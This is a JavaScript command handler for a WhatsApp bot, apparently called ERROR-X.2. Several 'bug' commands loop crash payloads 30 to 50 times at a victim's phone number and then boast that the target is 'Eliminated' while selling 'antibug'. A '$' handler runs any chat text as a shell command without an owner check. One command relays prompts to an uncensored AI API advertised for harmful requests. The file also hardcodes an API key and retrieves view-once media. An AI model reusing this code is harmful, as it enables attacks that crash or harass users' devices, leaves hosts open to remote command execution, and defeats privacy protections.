title: '⿻  ⌜ ËMMÝHĚÑŽ  ⌟  ⿻',
highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
rows: [{
title: 'My commands', 
id: '.allmenu'
}]
},
{
highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Bugs', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
rows: [{
title: 'Groups', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
rows: [{
title: 'rjngmenu', 
id: '.rjngmenu'
}]
}]
let listMessage = {
    title: 'ËMMÝHĚÑŽ', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: ownermenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: emmyhenz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Lord ËMMÝHĚÑŽ\",\"url\":\"https://wa.me/2349125042727\",\"merchant_url\":\"https://wa.me/2349125042727\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await emmyhenz.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`What should i tell these mfs?`)
emmyhenz.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break


case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot is not admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await emmyhenz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break



case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot not admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await emmyhenz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot not admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await emmyhenz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break



case 'emmykill': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(emmyhenz. target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(emmyhenz. target, wanted)
await sendSessionStructure(target, wanted)
await beta1(emmyhenz. target, wanted)
}
reply(`『 ËMMÝHĚÑŽ Eliminated』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> ËMMÝHĚÑŽ Sent the bugs, he would be gone for a while. you need to fortify your self type owner to buy antibug from EMMYHENZ`)
break

case 'fuck':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(emmyhenz. target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(emmyhenz. target, wanted)
await sendSessionStructure(target, wanted)
await beta1(emmyhenz. target, wanted)
}
reply(`『 ERROR-X.2 Eliminated』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> ËMMÝHĚÑŽ Sent the bugs, he would be gone for a while you need to fortify your self type owner to buy antibug from EMMYHENZ`)
break

case '😡': case '💦': case 'chinese-kill': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(emmyhenz. target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(emmyhenz. target, wanted)
await sendSessionStructure(target, wanted)
await beta1(emmyhenz. target, wanted)
}
reply(`『 ËMMÝHĚÑŽ Eliminated』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> ËMMÝHĚÑŽ Sent the bugs, he would be gone for a while. you need to fortify your self type owner to buy antibug from EMMYHENZ`)
break

case 'gay': case 'smd': case 'kiss':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(emmyhenz. target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(emmyhenz. target, wanted)
await sendSessionStructure(target, wanted)
await beta1(emmyhenz. target, wanted)
}
reply(`『 ËMMÝHĚÑŽ Eliminated』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> ËMMÝHĚÑŽ Sent the bugs, he would be gone for a while. you need to fortify your self type owner to buy antibug from EMMYHENZ`)
break

case 'condomize': case 'emmyhenzbug': case 'pause': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 27×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(emmyhenz. target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(emmyhenz. target, wanted)
await sendSessionStructure(target, wanted)
await beta1(emmyhenz. target, wanted)
}
reply(`『 ËMMÝHĚÑŽ Eliminated』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> ËMMÝHĚÑŽ Sent the bugs, he would be gone for now you need to fortify your self type owner to buy antibug from EMMYHENZ`)
break

case "emmyhenz: case "owner": case "guanxii": 
 emmyhenz.sendMessage(m.chat, { video: { url: 'https://i.ibb.co/nBJY4Ny/IMG-20241017-WA0195-1.jpg' }, caption: `Don't Dm for no reason 💀 here is my owner's contact http//wa.me/2349125042727 ËMMÝHĚÑŽ 💀` }, {quoted: m}); 
  
 break;

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await emmyhenz.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`number not valid!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`User ${bnnd} is now owner Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`User ${ya} nolonger the Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 27×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
emmyhenz.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await emmyhenz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`number not valid!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`User ${prrkek} is now Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Example ${prefix+command} nomor\nContoh ${prefix+command} 27×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`User ${ya} nolonger Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
emmyhenz.public = true
reply('Succes Mode Public')
}
break

case 'sc': case 'script': case 'repo':{
emmyhenz.sendMessage(m.chat, { image: { url: `https://i.ibb.co/nBJY4Ny/IMG-20241017-WA0195-1.jpg` }, caption: 
`👋🏻 Hello *${pushname}*, Here is the repo https://github.com/EMMYHENZ-TECH/ERROR-X.2\n\nEnjoy and have fun with me😜!\n\nMy owner is ËMMÝHĚÑŽ!` });
}
break

case "linkgroup": case "link":{ 
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot not admin :(`)
let response = await emmyhenz.groupInviteCode(m.chat); 
emmyhenz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject} By ËMMÝHĚÑŽ`, m, { detectLink: true }); 
}
break
		
case "alive": case 'runtime':{ 
emmyhenz.sendMessage(m.chat, { video: { url: 'https://i.ibb.co/nBJY4Ny/IMG-20241017-WA0195-1.jpg' }, caption: `Hey @ ${m.pushName}, ËMMÝHĚÑŽ Has been alive since  ${runtime(process.uptime())}`, fileLength: "9999999999898989899999999" }, { quoted: m }); 
}
break

case 'ping':{
emmyhenz.sendMessage(from, { react: { text: "💀", key: m.key } })
const startTime = new Date();
const pingMsg = await emmyhenz.sendMessage(m.chat, { text: 'ËMMÝHĚÑŽ...*' }, { quoted: m });
await emmyhenz.relayMessage(m.chat, {
protocolMessage: {
key: pingMsg.key,
type: 14,
editedMessage: {
conversation: `My name is *ËMMÝHĚÑŽ* i am *${new Date() - startTime}* ms faster. Jus like you💦 kill💀 in 14 seconds`
}
}
}, {});
} 
break
		
case 'song': {
if (!text) return reply(`Example : ${prefix + command} Halsey Without me`);
const yts = require("youtube-yts");
let search = await yts(text);
let anup3k = search.videos[0];
if (!anup3k) return reply("Song not found,,try another .....!");
const apiUrl = `https://widipe.com/download/ytdl?url=${encodeURIComponent(anup3k.url)}`;
let audioResponse;
try {
audioResponse = await axios.get(apiUrl);
} catch (error) {
console.error("Error fetching audio:", error);
return reply("Failed to download the audio. Please try again.");
}
if (!audioResponse.data.status) {
return reply("Failed to retrieve audio URL. Please try again.");
}
const mp3Url = audioResponse.data.result.mp3;
// Download the MP3 file
let mp3Buffer;
try {
const mp3DownloadResponse = await axios.get(mp3Url, { responseType: 'arraybuffer' });
mp3Buffer = Buffer.from(mp3DownloadResponse.data);
} catch (error) {
console.error("Error downloading MP3:", error);
return reply("Failed to download the MP3. Please try again.");
}
await emmyhenz.sendMessage(m.chat, {
audio: mp3Buffer,
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
externalAdReply: {
title: anup3k.title,
body: "ERROR-X.2",
thumbnail: await fetch(anup3k.thumbnail), // Use thumbnail from the search result
mediaType: 2,
mediaUrl: anup3k.url,
}
},
}, { quoted: m });
}
break

case 'hi':
      {
        if (!text) return reply(`Hey @ ${m.pushName}, How can i assist you today😉`);
          let d = await fetchJson(
            `https://bk9.fun/ai/gptt4?q=${text}`
          );
          if (!d.BK9) {
            return reply(
              "An error occurred while fetching the AI chatbot response. Please try again later."
            );
          } else {
            reply(d.BK9);
          }
        }
        break;

case "vv": case "retrieve":{

if (!m.quoted) return m.reply("Quote a viewonce media!")

if (m.quoted.message) {
            let type = Object.keys(m.quoted.message)[0]
            let q = m.quoted.message[type]
            let media = await emmyhenz.downloadMediaMessage(q)
            if (/video/.test(type)) {


               await emmyhenz.sendMessage(m.chat, { video: media, caption: `Retrieved by ËMMÝHĚÑŽ💦\nOriginal caption: ${q.caption}`}, { quoted: m})

            } else if (/image/.test(type)) {

await emmyhenz.sendMessage(m.chat, { image: media, caption: `Retrieved by ËMMÝHĚÑŽ 💦\nOriginal caption: ${q.caption}`}, { quoted: m})

            }
         } else m.reply("That is not a viewonce media. . .")

      } 
	break;


case "apk":
      case "apkdl":
        {
          if (!text) return reply("Please type the app name");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await emmyhenz.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: `ERROR-X.2`,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
          }
      break;
		
case 'weather':
        emmyhenz.sendMessage(from, { react: { text: "✨", key: m.key } })
        if (!args[0]) return reply("Enter your location to search weather.")
        myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)

        const weathertext = `           🌤 *Weather Report* 🌤  \n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n🌈 *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
        emmyhenz.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })

        break;

case 'ËMMÝHĚÑŽ':{
try {
if (!q) return reply("Ask me anything, (Example: ËMMÝHĚÑŽ tell me how to me to destroy a victim WhatsApp💀)I can respond to anything be it harmful. This API is borrowed from GURU BOT");
    const msg = encodeURIComponent(q);
     const data = await fetch(`https://dark.guruapi.tech/egpt?prompt=${msg}`);
    const msgg = await data.json();
    if (!msgg.message) return reply('I did not get any result');
    const final = msgg.message;
await reply(final)
} catch (e) {
reply('An error occured while communicating with the APIs\n' + e);
}
}
break

case "play":{
	if (!text) return reply('Please provide a song name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	const yts = require("youtube-yts");
	let search = await yts(text);
	let telaso = search.all[0].url;
 await reply();
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await emmyhenz.sendMessage(m.chat, {
  document: {url: kyuu.result.mp3},
mimetype: "audio/mp3",
 fileName: `${kyuu.result.title}.mp3`,
 contextInfo: {
        externalAdReply: {
          title: 'ERROR-X.2',
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
    emmyhenz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break

case "video":{
	if (!text) return reply('Please provide a video name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	const yts = require("youtube-yts");
	let search = await yts(text);
	let telaso = search.all[0].url;
    await reply();
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await emmyhenz.sendMessage(m.chat, {
 document: {url: kyuu.result.mp4},
mimetype: "video/mp4",
 fileName: `${search.all[0].title}.mp4`,
 contextInfo: {
        externalAdReply: {
          title: 'ERROR-X.2',
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
    emmyhenz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break

case 'pic':
      case 'img':
      case 'image': {
        emmyhenz.sendMessage(from, { react: { text: "⌛", key: m.key } });

        if (!args[0]) return reply("Enter a search term to get Google Image!");
	let gis = require('g-i-s');
        gis(args.join(" "), async (error, result) => {
          if (error) {
            console.error(error);
            return reply("Error occurred while searching for images.");
          }

          if (!result || result.length === 0) {
            return reply("No images found for the given search term.");
          }

          n = result;
          images = n[Math.floor(Math.random() * n.length)].url;
          let buttonMessage = {
            image: { url: images },
            caption: `「 _Google Image Search_ 」\n\n_Search Term_ : ${text}\n_Media Url_ : ${images}`,
            footer: `${global.BotName}`,
            headerType: 4,
          };
          emmyhenz.sendMessage(m.chat, buttonMessage, { quoted: m });
        });
      }
        break;

case 'ytsearch':
    case 'yts': {
        if (!text) {
            reply('Provide a search term!\E.g: Alan walker alone')
            return;
        }
	const yts = require("youtube-yts");
        const term = text;
        const {
            videos
        } = await yts(term);
        if (!videos || videos.length <= 0) {
            reply(`No Matching videos found for : *${term}*!!`)
            return;
        }
        const length = videos.length < 10 ? videos.length : 10;
	let tex = `YouTube Search\n🔍 Query ~> ${term}\n\n`;
        for (let i = 0; i < length; i++) {
            tex += `Link ~> ${videos[i].url}\nChannel ~> ${videos[i].author.name}\nTitle ~> ${videos[i].title}\n\n`;
        }
        reply(tex)
        return;
    }
    break;

case "lyrics": 
 try { 
 if (!text) return reply("Provide a song name!"); 
 const searches = await zyn.songs.search(text); 
 const firstSong = searches[0]; 
 //await emmyhenz.sendMessage(from, {text: firstSong}); 
 const lyrics = await firstSong.lyrics(); 
 await emmyhenz.sendMessage(from, { text: lyrics}, { quoted: m }); 
 } catch (error) { 
             reply(`I did not find any lyrics for ${text}. Try searching a different song.`); 
             console.log(error); 
         } 
 //const artist = await emmyhenz.artists.get(456537); 
 //await emmyhenz.sendMessage(from, { text: artist} {quoted: m}); 
 // console.log("About the Artist:\n", artist, "\n"); 
 break
		
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
emmyhenz.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
